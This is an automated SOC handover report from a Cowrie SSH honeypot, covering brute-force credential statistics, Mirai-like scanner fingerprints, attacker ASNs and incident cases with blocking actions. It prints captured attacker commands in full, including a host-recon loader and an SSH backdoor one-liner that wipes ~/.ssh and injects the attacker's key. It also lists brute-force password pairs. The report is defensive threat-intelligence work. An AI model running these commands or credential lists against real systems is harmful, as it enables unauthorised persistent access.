# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-11 |
| **Generated At** | 2026-07-11T13:28:48Z |
| **Shift Time** | 13:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **270** |
| Confirmed Threats | **261** |
| False Positives Filtered | **9** (3.3%) |
| Unique Attacker IPs | **65** |
| Countries of Origin | **23** |
| High Severity Cases | **142** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **128** |
| Malware Samples Analyzed | **4** HIGH · **35** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **180** |
| Unique Credential Pairs | **127** |
| Unique Usernames | **24** |
| Unique Passwords | **91** |
| Successful Auth Pairs | **159** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 62 |
| `admin` | 12 |
| `support` | 12 |
| `docker` | 9 |
| `www` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 10 |
| `123456` | 9 |
| `345gs5662d34` | 9 |
| `password` | 8 |
| `3245gs5662d34` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `LeitboGi0ro` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `ftpuser` | `ftppass` | 4 |
| `operator` | `ubuntu` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qq123123...` | `91.92.40.68` | 2026-07-11T10:55:32 |
| `root` | `P@ssword1234` | `10.0.0.73` | 2026-07-11T10:56:17 |
| `vagrant` | `password` | `91.92.40.233` | 2026-07-11T10:56:31 |
| `root` | `@` | `116.110.9.173` | 2026-07-11T10:57:28 |
| `vagrant` | `123456` | `91.92.40.233` | 2026-07-11T10:58:22 |
| `vagrant` | `qwerty` | `91.92.40.233` | 2026-07-11T11:00:16 |
| `admin` | `admin@123` | `116.110.9.173` | 2026-07-11T11:00:32 |
| `root` | `P@ssword1234` | `185.242.3.195` | 2026-07-11T11:00:36 |
| `vagrant` | `vagrant123` | `91.92.40.233` | 2026-07-11T11:02:11 |
| `vagrant` | `vm` | `91.92.40.233` | 2026-07-11T11:04:05 |
| `root` | `root123` | `171.231.192.229` | 2026-07-11T11:04:23 |
| `ftpuser` | `ftppass` | `65.20.138.3` | 2026-07-11T11:05:33 |
| `vagrant` | `box` | `91.92.40.233` | 2026-07-11T11:05:55 |
| `guest` | `guest` | `116.110.9.173` | 2026-07-11T11:06:26 |
| `vagrant` | `deploy` | `91.92.40.233` | 2026-07-11T11:07:43 |
| `support` | `Password01!` | `10.0.0.73` | 2026-07-11T11:07:43 |
| `ftpuser` | `ftppass` | `69.126.144.30` | 2026-07-11T11:09:25 |
| `vagrant` | `admin` | `91.92.40.233` | 2026-07-11T11:09:32 |
| `ftpuser` | `ftppass` | `103.68.22.115` | 2026-07-11T11:09:42 |
| `ftpuser` | `ftppass` | `10.0.0.73` | 2026-07-11T11:09:53 |
| `docker` | `docker` | `91.92.40.233` | 2026-07-11T11:11:21 |
| `admin` | `0l0ctyQh243O63uD` | `171.231.192.229` | 2026-07-11T11:11:39 |
| `docker` | `password` | `91.92.40.233` | 2026-07-11T11:13:08 |
| `admin` | `password` | `116.110.9.173` | 2026-07-11T11:14:21 |
| `web` | `a12345` | `185.242.3.195` | 2026-07-11T11:14:31 |
| `docker` | `123456` | `91.92.40.233` | 2026-07-11T11:14:52 |
| `docker` | `qwerty` | `91.92.40.233` | 2026-07-11T11:16:33 |
| `root` | `admin` | `94.154.43.230` | 2026-07-11T11:16:51 |
| `root` | `Qwe664814606.` | `91.92.40.68` | 2026-07-11T11:17:48 |
| `docker` | `docker123` | `91.92.40.233` | 2026-07-11T11:18:14 |
| `admin` | `admin01` | `171.231.192.229` | 2026-07-11T11:18:24 |
| `admin` | `123456` | `171.231.192.229` | 2026-07-11T11:19:40 |
| `docker` | `admin` | `91.92.40.233` | 2026-07-11T11:19:54 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-11T11:20:40 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-11T11:20:40 |
| `operator` | `ubuntu` | `196.188.93.169` | 2026-07-11T11:21:23 |
| `operator` | `ubuntu` | `121.179.93.147` | 2026-07-11T11:21:38 |
| `docker` | `container` | `91.92.40.233` | 2026-07-11T11:21:39 |
| `operator` | `ubuntu` | `10.0.0.73` | 2026-07-11T11:21:47 |
| `admin` | `admin123` | `116.110.9.173` | 2026-07-11T11:22:26 |
| `docker` | `deploy` | `91.92.40.233` | 2026-07-11T11:23:22 |
| `user` | `1234` | `116.110.9.173` | 2026-07-11T11:24:24 |
| `docker` | `root` | `91.92.40.233` | 2026-07-11T11:25:08 |
| `www` | `www` | `91.92.40.233` | 2026-07-11T11:26:55 |
| `admin` | `default` | `116.110.9.173` | 2026-07-11T11:27:00 |
| `ftp` | `ftp` | `116.110.9.173` | 2026-07-11T11:28:29 |
| `www` | `password` | `91.92.40.233` | 2026-07-11T11:28:41 |
| `web` | `a12345` | `10.0.0.73` | 2026-07-11T11:28:47 |
| `www` | `123456` | `91.92.40.233` | 2026-07-11T11:30:20 |
| `operator` | `operator` | `171.231.192.229` | 2026-07-11T11:30:27 |
| `root` | `7` | `185.112.148.66` | 2026-07-11T11:31:52 |
| `opt` | `opt` | `116.228.233.93` | 2026-07-11T11:31:57 |
| `345gs5662d34` | `345gs5662d34` | `116.228.233.93` | 2026-07-11T11:32:01 |
| `root` | `7` | `213.101.138.172` | 2026-07-11T11:32:02 |
| `opt` | `3245gs5662d34` | `116.228.233.93` | 2026-07-11T11:32:02 |
| `www` | `qwerty` | `91.92.40.233` | 2026-07-11T11:32:02 |
| `support` | `admin` | `171.231.192.229` | 2026-07-11T11:33:04 |
| `operator` | `webadmin` | `115.95.23.226` | 2026-07-11T11:33:24 |
| `www` | `admin` | `91.92.40.233` | 2026-07-11T11:33:48 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `216.226.77.20` | 2026-07-11T11:34:22 |
| `root` | `7` | `49.124.152.251` | 2026-07-11T11:35:10 |
| `www` | `www123` | `91.92.40.233` | 2026-07-11T11:35:32 |
| `root` | `7` | `10.0.0.73` | 2026-07-11T11:35:41 |
| `root` | `ipscan` | `171.231.192.229` | 2026-07-11T11:36:05 |
| `www` | `web` | `91.92.40.233` | 2026-07-11T11:37:19 |
| `www` | `host` | `91.92.40.233` | 2026-07-11T11:39:12 |
| `www` | `server` | `91.92.40.233` | 2026-07-11T11:41:03 |
| `www-data` | `www-data` | `91.92.40.233` | 2026-07-11T11:42:55 |
| `root` | `ROOT` | `122.166.253.226` | 2026-07-11T11:43:50 |
| `www-data` | `password` | `91.92.40.233` | 2026-07-11T11:44:49 |
| `www-data` | `123456` | `91.92.40.233` | 2026-07-11T11:46:45 |
| `marco` | `marco` | `185.242.3.195` | 2026-07-11T11:46:45 |
| `root` | `ROOT` | `60.18.139.82` | 2026-07-11T11:47:18 |
| `www-data` | `qwerty` | `91.92.40.233` | 2026-07-11T11:48:38 |
| `www-data` | `admin` | `91.92.40.233` | 2026-07-11T11:50:36 |
| `root` | `admin@2025` | `10.0.0.73` | 2026-07-11T11:52:28 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-11T11:52:31 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T11:52:32 |
| `www-data` | `web` | `91.92.40.233` | 2026-07-11T11:52:42 |
| `root` | `abc123@@` | `10.0.0.73` | 2026-07-11T11:53:46 |
| `ubuntu` | `!QAZ2wsx#EDC` | `10.0.0.73` | 2026-07-11T11:53:53 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T11:53:54 |
| `www-data` | `server` | `91.92.40.233` | 2026-07-11T11:54:42 |
| `guest` | `guest11` | `65.20.251.41` | 2026-07-11T11:55:48 |
| `guest` | `guest11` | `191.241.142.170` | 2026-07-11T11:55:57 |
| `www-data` | `apache` | `91.92.40.233` | 2026-07-11T11:56:28 |
| `www-data` | `nginx` | `91.92.40.233` | 2026-07-11T11:58:12 |
| `root` | `admin@123#` | `10.0.0.73` | 2026-07-11T11:58:52 |
| `guest` | `guest11` | `10.0.0.73` | 2026-07-11T11:59:55 |
| `backup` | `backup` | `91.92.40.233` | 2026-07-11T11:59:57 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-11T12:00:10 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-11T12:00:11 |
| `marco` | `marco` | `10.0.0.73` | 2026-07-11T12:01:02 |
| `backup` | `password` | `91.92.40.233` | 2026-07-11T12:01:44 |
| `root` | `Admin123456` | `50.187.155.130` | 2026-07-11T12:02:14 |
| `backup` | `123456` | `91.92.40.233` | 2026-07-11T12:03:31 |
| `backup` | `qwerty` | `91.92.40.233` | 2026-07-11T12:05:20 |
| `backup` | `backup123` | `91.92.40.233` | 2026-07-11T12:07:07 |
| `backup` | `admin` | `91.92.40.233` | 2026-07-11T12:08:58 |
| `root` | `123qwerty` | `195.178.110.228` | 2026-07-11T12:10:22 |
| `admin` | `admin` | `118.194.235.105` | 2026-07-11T12:10:34 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-11T12:10:35 |
| `backup` | `restore` | `91.92.40.233` | 2026-07-11T12:10:52 |
| `root` | `21` | `195.178.110.228` | 2026-07-11T12:12:17 |
| `backup` | `data` | `91.92.40.233` | 2026-07-11T12:12:45 |
| `root` | `321` | `195.178.110.228` | 2026-07-11T12:14:07 |
| `backup` | `server` | `91.92.40.233` | 2026-07-11T12:14:31 |
| `support` | `support` | `176.53.159.196` | 2026-07-11T12:15:18 |
| `root` | `4321` | `195.178.110.228` | 2026-07-11T12:15:57 |
| `root` | `Jh123456@` | `211.46.177.174` | 2026-07-11T12:16:17 |
| `345gs5662d34` | `345gs5662d34` | `211.46.177.174` | 2026-07-11T12:16:21 |
| `root` | `3245gs5662d34` | `211.46.177.174` | 2026-07-11T12:16:22 |
| `support` | `support` | `91.92.40.233` | 2026-07-11T12:16:23 |
| `support` | `support` | `10.0.0.73` | 2026-07-11T12:16:39 |
| `root` | `54321` | `195.178.110.228` | 2026-07-11T12:17:46 |
| `support` | `password` | `91.92.40.233` | 2026-07-11T12:18:15 |
| `root` | `P@ssw0rd!@` | `185.242.3.195` | 2026-07-11T12:18:48 |
| `root` | `P4ssw0rd` | `195.178.110.228` | 2026-07-11T12:19:29 |
| `support` | `123456` | `91.92.40.233` | 2026-07-11T12:20:07 |
| `root` | `P4ssword` | `195.178.110.228` | 2026-07-11T12:21:13 |
| `support` | `qwerty` | `91.92.40.233` | 2026-07-11T12:21:56 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-07-11T12:22:55 |
| `support` | `help` | `91.92.40.233` | 2026-07-11T12:23:41 |
| `runner` | `123456789` | `10.0.0.73` | 2026-07-11T12:23:55 |
| `root` | `Passw0rd` | `195.178.110.228` | 2026-07-11T12:24:42 |
| `support` | `admin` | `91.92.40.233` | 2026-07-11T12:25:23 |
| `root` | `letmein` | `195.178.110.228` | 2026-07-11T12:26:31 |
| `user` | `11` | `117.39.63.46` | 2026-07-11T12:26:55 |
| `support` | `tech` | `91.92.40.233` | 2026-07-11T12:27:05 |
| `user` | `11` | `10.0.0.73` | 2026-07-11T12:27:23 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-11T12:28:18 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-11T12:28:19 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-11T12:28:22 |
| `root` | `p4ssword` | `195.178.110.228` | 2026-07-11T12:28:28 |
| `ubnt` | `ubnt13` | `182.60.128.241` | 2026-07-11T12:28:57 |
| `ubnt` | `ubnt13` | `213.33.204.130` | 2026-07-11T12:29:04 |
| `git` | `1qaz!QAZ` | `10.0.0.73` | 2026-07-11T12:30:23 |
| `root` | `p@ssw0rd` | `195.178.110.228` | 2026-07-11T12:30:26 |
| `git` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T12:30:26 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-07-11T12:32:18 |
| `root` | `!qazxsw2` | `10.0.0.73` | 2026-07-11T12:32:20 |
| `root` | `P@ssw0rd!@` | `10.0.0.73` | 2026-07-11T12:33:17 |
| `root` | `password` | `195.178.110.228` | 2026-07-11T12:34:15 |
| `root` | `qwerty` | `195.178.110.228` | 2026-07-11T12:36:19 |
| `sshd` | `sshd` | `115.241.228.34` | 2026-07-11T12:36:41 |
| `sshd` | `sshd` | `136.185.6.181` | 2026-07-11T12:36:49 |
| `root` | `root1` | `195.178.110.228` | 2026-07-11T12:40:06 |
| `sshd` | `sshd` | `10.0.0.73` | 2026-07-11T12:40:32 |
| `root` | `root12` | `195.178.110.228` | 2026-07-11T12:41:56 |
| `root` | `root123` | `195.178.110.228` | 2026-07-11T12:43:42 |
| `root` | `root2026` | `195.178.110.228` | 2026-07-11T12:45:31 |
| `root` | `welcome` | `195.178.110.228` | 2026-07-11T12:47:27 |
| `centos` | `centos5` | `181.212.174.164` | 2026-07-11T12:49:00 |
| `centos` | `centos5` | `39.164.94.190` | 2026-07-11T12:49:09 |
| `admin` | `123456` | `195.178.110.228` | 2026-07-11T12:49:30 |
| `admin` | `123qwe` | `195.178.110.228` | 2026-07-11T12:51:35 |
| `root` | `id` | `185.242.3.195` | 2026-07-11T12:51:37 |
| `centos` | `centos5` | `65.20.237.191` | 2026-07-11T12:52:43 |
| `admin` | `123qwerty` | `195.178.110.228` | 2026-07-11T12:53:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **270** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 92 |
| OpenSSH | 22 |
| AsyncSSH (Python) | 18 |
| libssh | 17 |
| Paramiko (Python) | 10 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 76 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 22 | 22 |
| `fda360b1b4f4...` | Mirai/variant | 18 | 2 |
| `16443846184e...` | Generic scanner | 11 | 3 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 76 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 22 | 22 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 18 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 11 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `f555226df196...` | libssh | 7 | 3 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 74 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`, `91.92.40.233`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `211.46.177.174`, `116.228.233.93`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **65** |
| Unique ASNs | **49** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS51396` | Pfcloud UG | 3 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (142)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5ec01b2f375a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]68` |
| **First Seen** | 2026-07-11 10:55 |
| **Last Seen** | 2026-07-11 10:57 |
| **Session Duration** | 112s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 10:55:32` | `cowrie.session.connect` |
| `2026-07-11 10:55:32` | `cowrie.client.version` |
| `2026-07-11 10:55:32` | `cowrie.client.kex` |
| `2026-07-11 10:55:32` | `cowrie.login.success` |
| `2026-07-11 10:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]68` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ae988d15eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 10:56 |
| **Last Seen** | 2026-07-11 10:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 10:56:30` | `cowrie.session.connect` |
| `2026-07-11 10:56:30` | `cowrie.client.version` |
| `2026-07-11 10:56:30` | `cowrie.client.kex` |
| `2026-07-11 10:56:31` | `cowrie.login.success` |
| `2026-07-11 10:56:32` | `cowrie.session.params` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.success` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.command.input` |
| `2026-07-11 10:56:32` | `cowrie.log.closed` |
| `2026-07-11 10:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-646f967912f8

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 10:57 |
| **Last Seen** | 2026-07-11 10:57 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 10:57:19` | `cowrie.session.connect` |
| `2026-07-11 10:57:19` | `cowrie.client.version` |
| `2026-07-11 10:57:27` | `cowrie.client.kex` |
| `2026-07-11 10:57:28` | `cowrie.login.success` |
| `2026-07-11 10:57:28` | `cowrie.direct-tcpip.request` |
| `2026-07-11 10:57:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 10:57:39` | `cowrie.direct-tcpip.data` |
| `2026-07-11 10:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2621b2ad64fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 10:58 |
| **Last Seen** | 2026-07-11 10:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 10:58:22` | `cowrie.session.connect` |
| `2026-07-11 10:58:22` | `cowrie.client.version` |
| `2026-07-11 10:58:22` | `cowrie.client.kex` |
| `2026-07-11 10:58:22` | `cowrie.login.success` |
| `2026-07-11 10:58:23` | `cowrie.session.params` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.success` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.command.input` |
| `2026-07-11 10:58:23` | `cowrie.log.closed` |
| `2026-07-11 10:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4baf99336e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:00 |
| **Last Seen** | 2026-07-11 11:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:00:15` | `cowrie.session.connect` |
| `2026-07-11 11:00:15` | `cowrie.client.version` |
| `2026-07-11 11:00:15` | `cowrie.client.kex` |
| `2026-07-11 11:00:16` | `cowrie.login.success` |
| `2026-07-11 11:00:17` | `cowrie.session.params` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.success` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.command.input` |
| `2026-07-11 11:00:17` | `cowrie.log.closed` |
| `2026-07-11 11:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4ed25920e4

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 11:00 |
| **Last Seen** | 2026-07-11 11:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:00:30` | `cowrie.session.connect` |
| `2026-07-11 11:00:31` | `cowrie.client.version` |
| `2026-07-11 11:00:31` | `cowrie.client.kex` |
| `2026-07-11 11:00:32` | `cowrie.login.success` |
| `2026-07-11 11:00:32` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:00:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:00:33` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

